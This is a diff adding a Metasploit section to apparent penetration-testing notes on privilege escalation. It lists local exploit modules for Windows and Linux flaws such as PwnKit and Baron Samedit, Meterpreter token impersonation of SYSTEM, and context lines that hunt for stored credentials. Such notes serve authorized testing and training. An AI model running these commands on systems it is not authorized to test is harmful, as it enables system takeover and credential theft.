@@ -37,6 +37,32 @@ cmdkey /list ; reg query HKLM /f password /t REG_SZ /s   # stored creds
 
 Automate: `winPEASx64.exe`, `PowerUp.ps1` (`Invoke-AllChecks`).
 
+## Metasploit local privesc modules
+
+From a Meterpreter session, background it and try:
+```
+# Auto-suggest
+use post/multi/recon/local_exploit_suggester
+set SESSION <id>; run
+
+# Common Windows escalation
+use exploit/windows/local/ms16_075_reflection_juicy    # JuicyPotato
+use exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move
+use exploit/windows/local/always_install_elevated
+use exploit/windows/local/service_permissions           # weak service perms
+use exploit/windows/local/unquoted_service_path
+
+# Common Linux escalation
+use exploit/linux/local/cve_2021_4034_pwnkit            # PwnKit (pkexec)
+use exploit/linux/local/sudo_baron_samedit              # CVE-2021-3156
+use exploit/linux/local/overlayfs_priv_esc
+
+# Token impersonation (from Meterpreter)
+use incognito
+list_tokens -u
+impersonate_token "NT AUTHORITY\\SYSTEM"
+```
+
 ## After escalating
 
 Prove it: `whoami` / `id`, `hostname`, `ip a` — this is your screenshot proof. Re-run the
